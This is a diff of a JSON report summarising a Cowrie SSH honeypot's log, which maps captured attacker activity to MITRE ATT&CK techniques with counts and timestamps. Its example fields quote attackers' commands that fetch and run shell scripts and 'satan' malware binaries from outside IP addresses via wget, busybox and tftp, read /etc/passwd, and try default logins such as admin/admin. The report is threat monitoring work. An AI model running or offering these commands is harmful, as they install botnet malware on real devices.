@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-20 13:01:11",
+  "generated": "2026-08-20 14:00:45",
   "totals": {
-    "commands": 536,
-    "login_failed": 2280,
-    "login_success": 67,
-    "sessions": 2471
+    "commands": 613,
+    "login_failed": 2649,
+    "login_success": 73,
+    "sessions": 2849
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2280,
+      "count": 2649,
       "examples": [
         "nginx / 150.136.155.47",
         "tyre / tyre",
@@ -21,14 +21,14 @@
         "tyre / tyre1234"
       ],
       "first": "2026-08-20T00:02:12.859219Z",
-      "last": "2026-08-20T13:00:14.571435Z",
-      "unique_ips": 61
+      "last": "2026-08-20T14:00:43.848894Z",
+      "unique_ips": 67
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 77,
+      "count": 105,
       "examples": [
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/satan_mips; chmod 777 satan_mips; ./sat",
@@ -37,14 +37,14 @@
         "wget http://31.77.227.121/satan_mips_el; chmod 777 satan_mips_el; ./satan_mips_el; rm -rf satan_mips_el"
       ],
       "first": "2026-08-20T01:21:21.761677Z",
-      "last": "2026-08-20T12:27:03.500980Z",
-      "unique_ips": 10
+      "last": "2026-08-20T13:58:24.439494Z",
+      "unique_ips": 14
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 67,
+      "count": 73,
       "examples": [
         "admin / switch",
         "admin / admin",
@@ -53,14 +53,14 @@
         "enable\\x00 / system\\x00"
       ],
       "first": "2026-08-20T01:07:19.606932Z",
-      "last": "2026-08-20T12:49:42.994622Z",
-      "unique_ips": 47
+      "last": "2026-08-20T13:57:23.109611Z",
+      "unique_ips": 51
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 48,
+      "count": 65,
       "examples": [
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
         "http://2.26.136.128/twget.sh",
@@ -69,14 +69,14 @@
         "wget http://31.77.227.121/satan_arm; chmod 777 satan_arm; ./satan_arm; rm -rf satan_arm"
       ],
       "first": "2026-08-20T01:10:19.623993Z",
-      "last": "2026-08-20T12:27:03.500980Z",
-      "unique_ips": 10
+      "last": "2026-08-20T13:58:24.439494Z",
+      "unique_ips": 14
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 15,
+      "count": 16,
       "examples": [
         "uname -s -v -n -r -m",
         "uname -a",
@@ -85,8 +85,22 @@
         "cat /proc/cpuinfo"
       ],
       "first": "2026-08-20T04:16:38.276000Z",
-      "last": "2026-08-20T12:01:19.186574Z",
-      "unique_ips": 11
+      "last": "2026-08-20T13:42:28.292144Z",
+      "unique_ips": 12
+    },
+    {
+      "id": "T1033",
+      "name": "System Owner/User Discovery",
+      "tactic": "Discovery",
+      "count": 9,
+      "examples": [
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "id"
+      ],
+      "first": "2026-08-20T02:31:13.448948Z",
+      "last": "2026-08-20T13:57:46.822608Z",
+      "unique_ips": 9
     },
     {
       "id": "T1489",
@@ -101,19 +115,6 @@
       "first": "2026-08-20T01:07:25.922416Z",
       "last": "2026-08-20T07:29:50.494077Z",
       "unique_ips": 2
-    },
-    {
-      "id": "T1033",
-      "name": "System Owner/User Discovery",
-      "tactic": "Discovery",
-      "count": 6,
-      "examples": [
-        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
-      ],
-      "first": "2026-08-20T02:31:13.448948Z",
-      "last": "2026-08-20T12:26:27.325397Z",
-      "unique_ips": 6
     },
     {
       "id": "T1057",
@@ -179,6 +180,18 @@
       "unique_ips": 2
     },
     {
+      "id": "T1087.001",
+      "name": "Account Discovery: Local Account",
+      "tactic": "Discovery",
+      "count": 2,
+      "examples": [
+        "cat /etc/passwd"
+      ],
+      "first": "2026-08-20T13:22:29.801003Z",
+      "last": "2026-08-20T13:43:46.352019Z",
+      "unique_ips": 2
+    },
+    {
       "id": "T1037",
       "name": "Boot or Logon Initialization Scripts",
       "tactic": "Persistence",
@@ -222,11 +235,23 @@
     ],
     [
       "/bin/busybox",
-      24
+      31
     ],
     [
       "sh",
-      14
+      17
+    ],
+    [
+      "shell",
+      12
+    ],
+    [
+      "enable",
+      11
+    ],
+    [
+      "system",
+      11
     ],
     [
       "zalee",
@@ -241,32 +266,20 @@
       10
     ],
     [
-      "shell",
-      9
-    ],
-    [
-      "enable",
-      8
-    ],
-    [
-      "system",
-      8
-    ],
-    [
       "linuxshell",
-      7
+      8
     ],
     [
       "ping ;sh",
-      6
+      7
     ],
     [
       "enablelinuxshell",
-      5
+      6
     ],
     [
       "cd /proc && cat self/cmdline",
-      5
+      6
     ],
     [
       "shel",
@@ -274,7 +287,7 @@
     ],
     [
       "busybox",
-      3
+      4
     ],
     [
       "ping; sh",
@@ -289,11 +302,11 @@
       2
     ],
     [
-      "/ip cloud print",
+      "RPMA",
       2
     ],
     [
-      "locate D877F783D5D3EF8Cs",
+      "AMOO",
       2
     ]
   ]
